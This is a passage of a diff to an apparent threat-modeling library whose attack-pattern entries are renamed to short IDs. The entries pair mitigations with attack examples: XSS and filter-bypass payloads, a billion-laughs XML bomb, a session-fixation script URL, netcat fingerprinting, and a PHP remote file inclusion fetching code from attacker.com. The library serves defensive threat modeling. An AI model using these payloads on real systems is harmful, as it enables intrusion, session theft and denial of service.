-DOM) p.o.box 11111 SLC, UT 84151 US Domain Name: nijasvspirates.ORG Administrative Contact, Billing Contact: Smith, John jsmith@anonymous.net FooBar p.o.box 11111 SLC, UT 84151 555-555-6103 Technical Contact: Johnson, Ken kj@fierymonkey.org fierymonkey p.o.box 11111 SLC, UT 84151 555-555-3849 Record last updated on 17-Aug-2001. Record expires on 11-Aug-2002. Record created on 11-Aug-2000. Database last updated on 12-Dec-2001 04:06:00 EST. Domain servers in listed order: NS1. fierymonkey.ORG 192.173.28.130 NS2. fierymonkey.ORG 64.192.168.80 A corner stone of footprinting is Port Scanning. Let's port scan nijasvspirates.org and see what kind of services are running on that box. We type in the nijasvspirates IP into the Host prompt of the Port Scan window. We'll start searching from port number 1, and we'll stop at the default Sub7 port, 27374. Our results are: 21 TCP ftp 22 TCP ssh SSH-1.99-OpenSSH_2.30 25 TCP smtp 53 TCP domain 80 TCP www 110 TCP pop3 111 TCP sunrpc 113 TCP ident Just by this we know that Alice is running a website and email, using POP3, SUNRPC (SUN Remote Procedure Call), and ident."
  },
- "Using Malicious Files": {
+ "AC06": {
    "SID": "40",
    "target": Server,
    "description": "Using Malicious Files",
@@ -505,12 +467,11 @@ Threats = {
    "Likelihood Of Attack": "High",
    "severity": "Very High",
    "condition": "target.isHardened is False or target.hasAccessControl is False",
-   "Prerequisites": "System's configuration must allow an attacker to directly access executable files or upload files to execute. This means that any access control system that is supposed to mediate communications between the subject and the object is set incorrectly or assumes a benign environment.",
-   "Consequences": "SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary CodeSCOPE:IntegrityTECHNICAL IMPACT:Modify DataSCOPE:ConfidentialityTECHNICAL IMPACT:Read DataSCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges",
+   "prerequisites": "System's configuration must allow an attacker to directly access executable files or upload files to execute. This means that any access control system that is supposed to mediate communications between the subject and the object is set incorrectly or assumes a benign environment.",
    "mitigations": "Design: Enforce principle of least privilegeDesign: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.",
    "example": "Consider a directory on a web server with the following permissions drwxrwxrwx 5 admin public 170 Nov 17 01:08 webroot This could allow an attacker to both execute and upload and execute programs' on the web server. This one vulnerability can be exploited by a threat to probe the system and identify additional vulnerabilities to exploit."
  },
- "Web Application Fingerprinting": {
+ "HA03": {
    "SID":"41",
    "target": Server,
    "description": "Web Application Fingerprinting",
@@ -518,12 +479,11 @@ Threats = {
    "Likelihood Of Attack": "High",
    "severity": "Low",
    "condition": "target.validatesHeaders is False or target.encodesOutput is False or target.isHardened is False",
-   "Prerequisites": "Any web application can be fingerprinted. However, some configuration choices can limit the useful information an attacker may collect during a fingerprinting attack.",
-   "Consequences": "SCOPE:ConfidentialityTECHNICAL IMPACT:Other:NOTE:Confidentiality Other Information Leakage",
+   "prerequisites": "Any web application can be fingerprinted. However, some configuration choices can limit the useful information an attacker may collect during a fingerprinting attack.",
    "mitigations": "Implementation: Obfuscate server fields of HTTP response.Implementation: Hide inner ordering of HTTP response header.Implementation: Customizing HTTP error codes such as 404 or 500.Implementation: Hide URL file extension.Implementation: Hide HTTP response header software information filed.Implementation: Hide cookie's software information filed.Implementation: Appropriately deal with error messages.Implementation: Obfuscate database type in Database API's error message.",
    "example": "An attacker sends malformed requests or requests of nonexistent pages to the server. Consider the following HTTP responses. Response from Apache 1.3.23$ nc apache.server.com80 GET / HTTP/3.0 HTTP/1.1 400 Bad RequestDate: Sun, 15 Jun 2003 17:12: 37 GMTServer: Apache/1.3.23Connection: closeTransfer: chunkedContent-Type: text/HTML; charset=iso-8859-1 Response from IIS 5.0$ nc iis.server.com 80GET / HTTP/3.0 HTTP/1.1 200 OKServer: Microsoft-IIS/5.0Content-Location: http://iis.example.com/Default.htmDate: Fri, 01 Jan 1999 20:14: 02 GMTContent-Type: text/HTMLAccept-Ranges: bytes Last-Modified: Fri, 01 Jan 1999 20:14: 02 GMTETag: W/e0d362a4c335be1: ae1Content-Length: 133 [R.170.2]"
  },
- "XSS Targeting Non-Script Elements": {
+ "SC02": {
    "SID": "42",
    "target": Server,
    "description": "XSS Targeting Non-Script Elements",
@@ -531,12 +491,11 @@ Threats = {
    "Likelihood Of Attack": "High",
    "severity": "Very High",
    "condition": "target.validatesInput is False or target.encodesOutput is False",
-   "Prerequisites": "The target client software must allow the execution of scripts generated by remote hosts.",
-   "Consequences": "SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary CodeSCOPE:ConfidentialityTECHNICAL IMPACT:Read Data",
+   "prerequisites": "The target client software must allow the execution of scripts generated by remote hosts.",
    "mitigations": "In addition to the traditional input fields, all other user controllable inputs, such as image tags within messages or the likes, must also be subjected to input validation. Such validation should ensure that content that can be potentially interpreted as script by the browser is appropriately filtered.All output displayed to clients must be properly escaped. Escaping ensures that the browser interprets special scripting characters literally and not as script to be executed.",
    "example": "An online discussion forum allows its members to post HTML-enabled messages, which can also include image tags. A malicious user embeds JavaScript in the IMG tags in his messages that gets executed within the victim's browser whenever the victim reads these messages. <img src=javascript:alert('XSS')> When executed within the victim's browser, the malicious script could accomplish a number of adversary objectives including stealing sensitive information such as usernames, passwords, or cookies."
  },
- "Exploiting Incorrectly Configured Access Control Security Levels": {
+ "AC07": {
    "SID":"43",
    "target": Server,
    "description": "Exploiting Incorrectly Configured Access Control Security Levels",
@@ -544,12 +503,11 @@ Threats = {
    "Likelihood Of Attack": "High",
    "severity": "Medium",
    "condition": "target.hasAccessControl is False",
-   "Prerequisites": "The target must apply access controls, but incorrectly configure them. However, not all incorrect configurations can be exploited by an attacker. If the incorrect configuration applies too little security to some functionality, then the attacker may be able to exploit it if the access control would be the only thing preventing an attacker's access and it no longer does so. If the incorrect configuration applies too much security, it must prevent legitimate activity and the attacker must be able to force others to require this activity..",
-   "Consequences": "SCOPE:IntegrityTECHNICAL IMPACT:Modify DataSCOPE:ConfidentialityTECHNICAL IMPACT:Read DataSCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary CodeSCOPE:AuthorizationTECHNICAL IMPACT:Gain PrivilegesSCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection MechanismSCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution",
+   "prerequisites": "The target must apply access controls, but incorrectly configure them. However, not all incorrect configurations can be exploited by an attacker. If the incorrect configuration applies too little security to some functionality, then the attacker may be able to exploit it if the access control would be the only thing preventing an attacker's access and it no longer does so. If the incorrect configuration applies too much security, it must prevent legitimate activity and the attacker must be able to force others to require this activity..",
    "mitigations": "Design: Configure the access control correctly.",
    "example": "For example, an incorrectly configured Web server, may allow unauthorized access to it, thus threaten the security of the Web application."
  },
- "IMAP/SMTP Command Injection": {
+ "IN15": {
    "SID": "44",
    "target": Server,
    "description": "IMAP/SMTP Command Injection",
@@ -557,25 +515,23 @@ Threats = {
    "Likelihood Of Attack": "",
    "severity": "Medium",
    "condition": "(target.protocol == 'IMAP' or target.protocol == 'SMTP') and target.sanitizesInput is False",
-   "Prerequisites": "The target environment must consist of a web-mail server that the attacker can query and a back-end mail server. The back-end mail server need not be directly accessible to the attacker.The web-mail server must fail to adequately sanitize fields received from users and passed on to the back-end mail server.The back-end mail server must not be adequately secured against receiving malicious commands from the web-mail server.",
-   "Consequences": "",
+   "prerequisites": "The target environment must consist of a web-mail server that the attacker can query and a back-end mail server. The back-end mail server need not be directly accessible to the attacker.The web-mail server must fail to adequately sanitize fields received from users and passed on to the back-end mail server.The back-end mail server must not be adequately secured against receiving malicious commands from the web-mail server.",
    "mitigations": "All user-controllable input should be validated and filtered for potentially unwanted characters. Whitelisting input is desired, but if a blacklisting approach is necessary, then focusing on command related terms and delimiters is necessary. Input should be encoded prior to use in commands to make sure command related characters are not treated as part of the command. For example, quotation characters may need to be encoded so that the application does not treat the quotation as a delimiter. Input should be parameterized, or restricted to data sections of a command, thus removing the chance that the input will be treated as part of the command itself.",
    "example": "An adversary looking to execute a command of their choosing, injects new items into an existing command thus modifying interpretation away from what was intended. Commands in this context are often standalone strings that are interpreted by a downstream component and cause specific responses. This type of attack is possible when untrusted values are used to build these command strings. Weaknesses in input validation or command construction can enable the attack and lead to successful exploitation."
  },
- "Reverse Engineering": {
+ "HA04": {
    "SID": "45",
    "target": ExternalEntity,
    "description": "Reverse Engineering",
    "details": "An adversary discovers the structure, function, and composition of an object, resource, or system by using a variety of analysis techniques to effectively determine how the analyzed entity was constructed or operates. The goal of reverse engineering is often to duplicate the function, or a part of the function, of an object in order to duplicate or back engineer some aspect of its functioning. Reverse engineering techniques can be applied to mechanical objects, electronic devices, or software, although the methodology and techniques involved in each type of analysis differ widely.",
    "Likelihood Of Attack": "Low",
    "severity": "Low",
-   "condition": "target.hasPhysicalAccess is False",
-   "Prerequisites": "Access to targeted system, resources, and information.",
-   "Consequences": "",
+   "condition": "target.hasPhysicalAccess is True",
+   "prerequisites": "Access to targeted system, resources, and information.",
    "mitigations": "Employ code obfuscation techniques to prevent the adversary from reverse engineering the targeted entity.",
    "example": "When adversaries are reverse engineering software, methodologies fall into two broad categories, 'white box' and 'black box.' White box techniques involve methods which can be applied to a piece of software when an executable or some other compiled object can be directly subjected to analysis, revealing at least a portion of its machine instructions that can be observed upon execution. 'Black Box' methods involve interacting with the software indirectly, in the absence of the ability to measure, instrument, or analyze an executable object directly. Such analysis typically involves interacting with the software at the boundaries of where the software interfaces with a larger execution environment, such as input-output vectors, libraries, or APIs."
  },
- "Embedding Scripts within Scripts": {
+ "SC03": {
    "SID":"46",
    "target": Server,
    "description": "Embedding Scripts within Scripts",
@@ -583,25 +539,23 @@ Threats = {
    "Likelihood Of Attack": "High",
    "severity": "High",
    "condition": "target.validatesInput is False or target.sanitizesInput is False or target.hasAccessControl is False",
-   "Prerequisites": "Target software must be able to execute scripts, and also grant the adversary privilege to write/upload scripts.",
-   "Consequences": "SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary CodeSCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges",
+   "prerequisites": "Target software must be able to execute scripts, and also grant the adversary privilege to write/upload scripts.",
    "mitigations": "Use browser technologies that do not allow client side scripting.Utilize strict type, character, and encoding enforcement.Server side developers should not proxy content via XHR or other means. If a HTTP proxy for remote content is setup on the server side, the client's browser has no way of discerning where the data is originating from.Ensure all content that is delivered to client is sanitized against an acceptable content specification.Perform input validation for all remote content.Perform output validation for all remote content.Disable scripting languages such as JavaScript in browserSession tokens for specific hostPatching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.Privileges are constrained, if a script is loaded, ensure system runs in chroot jail or other limited authority mode",
    "example": "Ajax applications enable rich functionality for browser based web applications. Applications like Google Maps deliver unprecedented ability to zoom in and out, scroll graphics, and change graphic presentation through Ajax. The security issues that an attacker may exploit in this instance are the relative lack of security features in JavaScript and the various browser's implementation of JavaScript, these security gaps are what XSS and a host of other client side vulnerabilities are based on. While Ajax may not open up new security holes, per se, due to the conversational aspects between client and server of Ajax communication, attacks can be optimized. A single zoom in or zoom out on a graphic in an Ajax application may round trip to the server dozens of times. One of the first steps many attackers take is frequently footprinting an environment, this can include scanning local addresses like 192.*.*.* IP addresses, checking local directories, files, and settings for known vulnerabilities, and so on. <IMG SRC=javascript:alert('XSS')> The XSS script that is embedded in a given IMG tag can be manipulated to probe a different address on every click of the mouse or other motions that the Ajax application is aware of. In addition the enumerations allow for the attacker to nest sequential logic in the attacks. While Ajax applications do not open up brand new attack vectors, the existing attack vectors are more than adequate to execute attacks, and now these attacks can be optimized to sequentially execute and enumerate host environments.~/.bash_profile and ~/.bashrc are executed in a user's context when a new shell opens or when a user logs in so that their environment is set correctly. ~/.bash_profile is executed for login shells and ~/.bashrc is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), ~/.bash_profile is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, ~/.bashrc is executed. This allows users more fine grained control over when they want certain commands executed. These files are meant to be written to by the local user to configure their own environment; however, adversaries can also insert code into these files to gain persistence each time a user logs in or opens a new shell."
  },
- "PHP Remote File Inclusion": {
+ "IN16": {
    "SID":"47",
    "target": Server,
-   "description": "Embedding Scripts within Scripts",
+   "description": "PHP Remote File Inclusion",
    "details": "In this pattern the adversary is able to load and execute arbitrary code remotely available from the application. This is usually accomplished through an insecurely configured PHP runtime environment and an improperly sanitized include or require call, which the user can then control to point to any web-accessible file. This allows adversaries to hijack the targeted application and force it to execute their own instructions.",
    "Likelihood Of Attack": "High",
    "severity": "High",
    "condition": "target.validatesInput is False",
-   "Prerequisites": "Target application server must allow remote files to be included in the require, include, etc. PHP directivesThe adversary must have the ability to make HTTP requests to the target web application.",
-   "Consequences": "SCOPE:IntegrityTECHNICAL IMPACT:Modify DataSCOPE:ConfidentialityTECHNICAL IMPACT:Read DataSCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary CodeSCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-RepudiationTECHNICAL IMPACT:Gain PrivilegesSCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism",
+   "prerequisites": "Target application server must allow remote files to be included in the require, include, etc. PHP directivesThe adversary must have the ability to make HTTP requests to the target web application.",
    "mitigations": "Implementation: Perform input validation for all remote content, including remote and user-generated contentImplementation: Only allow known files to be included (whitelist)Implementation: Make use of indirect references passed in URL parameters instead of file namesConfiguration: Ensure that remote scripts cannot be include in the include or require PHP directives",
    "example": "The adversary controls a PHP script on a server http://attacker.com/rfi.txt The .txt extension is given so that the script doesn't get executed by the attacker.com server, and it will be downloaded as text. The target application is vulnerable to PHP remote file inclusion as following: include($_GET['filename'] . '.txt') The adversary creates an HTTP request that passes his own script in the include: http://example.com/file.php?filename=http://attacker.com/rfi with the concatenation of the .txt prefix, the PHP runtime download the attack's script and the content of the script gets executed in the same context as the rest of the original script."
  },
- "Principal Spoof": {
+ "AA02": {
    "SID": "48",
    "target": (Server, Process),
    "description": "Principal Spoof",
@@ -609,38 +563,35 @@ Threats = {
    "Likelihood Of Attack": "",
    "severity": "Medium",
    "condition": "target.authenticatesSource is False",
-   "Prerequisites": "The target must associate data or activities with a person's identity and the adversary must be able to modify this identity without detection.",
-   "Consequences": "",
+   "prerequisites": "The target must associate data or activities with a person's identity and the adversary must be able to modify this identity without detection.",
    "mitigations": "Employ robust authentication processes (e.g., multi-factor authentication).",
    "example": "An adversary may craft messages that appear to come from a different principle or use stolen / spoofed authentication credentials."
  },
- "Session Credential Falsification through Forging": {
+ "CR04": {
    "SID":"49",
    "target": Server,
    "description":"Session Credential Falsification through Forging",
    "details": "An attacker creates a false but functional session credential in order to gain or usurp access to a service. Session credentials allow users to identify themselves to a service after an initial authentication without needing to resend the authentication information (usually a username and password) with every message. If an attacker is able to forge valid session credentials they may be able to bypass authentication or piggy-back off some other authenticated user's session. This attack differs from Reuse of Session IDs and Session Sidejacking attacks in that in the latter attacks an attacker uses a previous or existing credential without modification while, in a forging attack, the attacker must create their own credential, although it may be based on previously observed credentials.",
    "Likelihood Of Attack": "Medium",
    "severity": "Medium",
-   "condition": "target.usesSessionTokens is True and implementsNonce is False",
-   "Prerequisites": "The targeted application must use session credentials to identify legitimate users. Session identifiers that remains unchanged when the privilege levels change. Predictable session identifiers.",
-   "Consequences": "SCOPE:IntegrityTECHNICAL IMPACT:Modify DataSCOPE:ConfidentialityTECHNICAL IMPACT:Read DataSCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary CodeSCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-RepudiationTECHNICAL IMPACT:Gain PrivilegesSCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism",
+   "condition": "target.usesSessionTokens is True and target.implementsNonce is False",
+   "prerequisites": "The targeted application must use session credentials to identify legitimate users. Session identifiers that remains unchanged when the privilege levels change. Predictable session identifiers.",
    "mitigations": "Implementation: Use session IDs that are difficult to guess or brute-force: One way for the attackers to obtain valid session IDs is by brute-forcing or guessing them. By choosing session identifiers that are sufficiently random, brute-forcing or guessing becomes very difficult.Implementation: Regenerate and destroy session identifiers when there is a change in the level of privilege: This ensures that even though a potential victim may have followed a link with a fixated identifier, a new one is issued when the level of privilege changes.",
    "example": "This example uses client side scripting to set session ID in the victim's browser. The JavaScript code document.cookie=sessionid=0123456789 fixates a falsified session credential into victim's browser, with the help of crafted a URL link. http://www.example.com/<script>document.cookie=sessionid=0123456789;</script> A similar example uses session ID as an argument of the URL. http://www.example.com/index.php/sessionid=0123456789 Once the victim clicks the links, the attacker may be able to bypass authentication or piggy-back off some other authenticated victim's session."
  },
- "XML Entity Expansion": {
+ "DO04": {
    "SID": "50",
    "target": Dataflow,
    "description": "XML Entity Expansion",
    "details": "An attacker submits an XML document to a target application where the XML document uses nested entity expansion to produce an excessively large output XML. XML allows the definition of macro-like structures that can be used to simplify the creation of complex structures. However, this capability can be abused to create excessive demands on a processor's CPU and memory. A small number of nested expansions can result in an exponential growth in demands on memory.",
    "Likelihood Of Attack": "High",
    "severity": "Medium",
-   "condition": "target.data == 'XML' and target.handlesResourceConsumption is False",
-   "Prerequisites": "This type of attack requires that the target must receive XML input but either fail to provide an upper limit for entity expansion or provide a limit that is so large that it does not preclude significant resource consumption.",
-   "Consequences": "SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution:TECHNICAL IMPACT:Resource Consumption:NOTE:Availability Unreliable Execution Resource Consumption Denial of Service",
+   "condition": "target.data == 'XML' and target.handlesResources is False",
+   "prerequisites": "This type of attack requires that the target must receive XML input but either fail to provide an upper limit for entity expansion or provide a limit that is so large that it does not preclude significant resource consumption.",
    "mitigations": "Design: Use libraries and templates that minimize unfiltered input. Use methods that limit entity expansion and throw exceptions on attempted entity expansion.Implementation: Disable altogether the use of inline DTD schemas in your XML parsing objects. If must use DTD, normalize, filter and white list and parse with methods and routines that will detect entity expansion from untrusted sources.",
    "example": "The most common example of this type of attack is the many laughs attack (sometimes called the 'billion laughs' attack). For example: <?xml version=1.0?><!DOCTYPE lolz [<!ENTITY lol lol><!ENTITY lol2 &lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;><!ENTITY lol3 &lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;><!ENTITY lol4 &lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;><!ENTITY lol5 &lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;><!ENTITY lol6 &lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;><!ENTITY lol7 &lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6><!ENTITY lol8 &lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;><!ENTITY lol9 &lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;> ]><lolz>&lol9;</lolz> This is well formed and valid XML according to the DTD. Each entity increases the number entities by a factor of 10. The line of XML containing lol9; expands out exponentially to a message with 10^9 entities. A small message of a few KBs in size can easily be expanded into a few GB of memory in the parser. By including 3 more entities similar to the lol9 entity in the above code to the DTD, the program could expand out over a TB as there will now be 10^12 entities. Depending on the robustness of the target machine, this can lead to resource depletion, application crash, or even the execution of arbitrary code through a buffer overflow."
  },
- "XSS Targeting Error Pages": {
+ "DS04": {
    "SID": "51",
    "target": Server,
    "description": "XSS Targeting Error Pages",
@@ -648,25 +599,23 @@ Threats = {
    "Likelihood Of Attack": "",
    "severity": "Medium",
    "condition": "target.encodesOutput is False or target.validatesInput is False or target.sanitizesInput is False",
-   "Prerequisites": "A third party web server which fails to adequately sanitize messages sent in error pages.The victim must be made to execute a query crafted by the attacker which results in the infected error report.",
-   "Consequences": "",
+   "prerequisites": "A third party web server which fails to adequately sanitize messages sent in error pages.The victim must be made to execute a query crafted by the attacker which results in the infected error report.",
    "mitigations": "Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and white list any input that will be used in error messages.Implementation: The victim should configure the browser to minimize active content from untrusted sources.",
    "example": "A third party web server fails to adequately sanitize messages sent in error pages. Adversary takes advantage of the data displayed in the error message."
  },
- "XSS Using Alternate Syntax": {
+ "SC04": {
    "SID": "52",
    "target": Server,
    "description": "XSS Using Alternate Syntax",   
    "details": "An adversary uses alternate forms of keywords or commands that result in the same action as the primary form but which may not be caught by filters. For example, many keywords are processed in a case insensitive manner. If the site's web filtering algorithm does not convert all tags into a consistent case before the comparison with forbidden keywords it is possible to bypass filters (e.g., incomplete black lists) by using an alternate case structure. For example, the script tag using the alternate forms of Script or ScRiPt may bypass filters where script is the only form tested. Other variants using different syntax representations are also possible as well as using pollution meta-characters or entities that are eventually ignored by the rendering engine. The attack can result in the execution of otherwise prohibited functionality.",
    "Likelihood Of Attack": "High",
    "severity": "High",
-   "Prerequisites": "Target client software must allow scripting such as JavaScript.",
    "condition": "target.sanitizesInput is False or target.validatesInput is False or target.encodesOutput is False",
-   "Consequences": "SCOPE:IntegrityTECHNICAL IMPACT:Modify DataSCOPE:ConfidentialityTECHNICAL IMPACT:Read DataSCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary CodeSCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-RepudiationTECHNICAL IMPACT:Gain PrivilegesSCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism",
+   "prerequisites": "Target client software must allow scripting such as JavaScript.",
    "mitigations": "Design: Use browser technologies that do not allow client side scripting.Design: Utilize strict type, character, and encoding enforcementImplementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.Implementation: Perform input validation for all remote content, including remote and user-generated contentImplementation: Perform output validation for all remote content.Implementation: Disable scripting languages such as JavaScript in browserImplementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.",
    "example": "In this example, the attacker tries to get a script executed by the victim's browser. The target application employs regular expressions to make sure no script is being passed through the application to the web page; such a regular expression could be ((?i)script), and the application would replace all matches by this regex by the empty string. An attacker will then create a special payload to bypass this filter: <scriscriptpt>alert(1)</scscriptript> when the applications gets this input string, it will replace all script (case insensitive) by the empty string and the resulting input will be the desired vector by the attacker. In this example, we assume that the application needs to write a particular string in a client-side JavaScript context (e.g., <script>HERE</script>). For the attacker to execute the same payload as in the previous example, he would need to send alert(1) if there was no filtering. The application makes use of the following regular expression as filter ((w+)s*(.*)|alert|eval|function|document) and replaces all matches by the empty string. For example each occurrence of alert(), eval(), foo() or even the string alert would be stripped. An attacker will then create a special payload to bypass this filter: this['al' + 'ert'](1) when the applications gets this input string, it won't replace anything and this piece of JavaScript has exactly the same runtime meaning as alert(1). The attacker could also have used non-alphanumeric XSS vectors to bypass the filter; for example, ($=[$=[]][(__=!$+$)[_=-~-~-~$]+({}+$)[_/_]+($$=($_=!''+$)[_/_]+$_[+$])])()[__[_/_]+__[_+~$]+$_[_]+$$](_/_) would be executed by the JavaScript engine like alert(1) is."
  },
- "Encryption Brute Forcing": {
+ "CR05": {
    "SID":"53",
    "target": (Server,Datastore),
    "description": "Encryption Brute Forcing",
@@ -674,12 +623,11 @@ Threats = {
    "Likelihood Of Attack": "Low",
    "severity": "Low",
    "condition": "target.usesEncryptionAlgorithm != 'RSA' or target.usesEncryptionAlgorithm != 'AES'",
-   "Prerequisites": "Ciphertext is known.Encryption algorithm and key size are known.",
-   "Consequences": "SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data",
+   "prerequisites": "Ciphertext is known.Encryption algorithm and key size are known.",
    "mitigations": "Use commonly accepted algorithms and recommended key sizes. The key size used will depend on how important it is to keep the data confidential and for how long.In theory a brute force attack performing an exhaustive key space search will always succeed, so the goal is to have computational security. Moore's law needs to be taken into account that suggests that computing resources double every eighteen months.",
    "example": "In 1997 the original DES challenge used distributed net computing to brute force the encryption key and decrypt the ciphertext to obtain the original plaintext. Each machine was given its own section of the key space to cover. The ciphertext was decrypted in 96 days."
  }, 
- "Manipulate Registry Information": {
+ "AC08": {
    "SID":"54",
    "target": Server,
    "description": "Manipulate Registry Information",
@@ -687,12 +635,11 @@ Threats = {
    "Likelihood Of Attack": "",
    "severity": "Medium",
    "condition": "target.hasAccessControl is False",
-   "Prerequisites": "The targeted application must rely on values stored in a registry.The adversary must have a means of elevating permissions in order to access and modify registry content through either administrator privileges (e.g., credentialed access), or a remote access tool capable of editing a registry through an API.",
-   "Consequences": "",
+   "prerequisites": "The targeted application must rely on values stored in a registry.The adversary must have a means of elevating permissions in order to access and modify registry content through either administrator privileges (e.g., credentialed access), or a remote access tool capable of editing a registry through an API.",
    "mitigations": "Ensure proper permissions are set for Registry hives to prevent users from modifying keys.Employ a robust and layered defensive posture in order to prevent unauthorized users on your system.Employ robust identification and audit/blocking via whitelisting of applications on your system. Unnecessary applications, utilities, and configurations will have a presence in the system registry that can be leveraged by an adversary through this attack pattern.",
    "example": "Manipulating registration information can be undertaken in advance of a path traversal attack (inserting relative path modifiers) or buffer overflow attack (enlarging a registry value beyond an application's ability to store it)."
  },
- "Lifting Sensitive Data Embedded in Cache": {
+ "DS05": {
    "SID": "55",
    "target": Server,
    "description": "Lifting Sensitive Data Embedded in Cache",
@@ -700,9 +647,9 @@ Threats = {
    "Likelihood Of Attack": "",
    "severity": "Medium",
    "condition": "target.usesCache is True",
-   "Prerequisites": "The target application must store sensitive information in a cache.The cache must be inadequately protected against attacker access.",
-   "Consequences": "",
+   "prerequisites": "The target application must store sensitive information in a cache.The cache must be inadequately protected against attacker access.",
    "mitigations": "Remove potentially sensitive information from cache that is not necessary for the application's functionality.",
    "example": "An adversary actively probes the target in a manner that is designed to solicit information that could be leveraged for malicious purposes. This is achieved by exploring the target via ordinary interactions for the purpose of gathering intelligence about the target, or by sending data that is syntactically invalid or non-standard in an attempt to produce a response that contains the desired data. As a result of these interactions, the adversary is able to obtain information from the target that aids the attacker in making inferences about its security, configuration, or potential vulnerabilities."
  }
 }
+
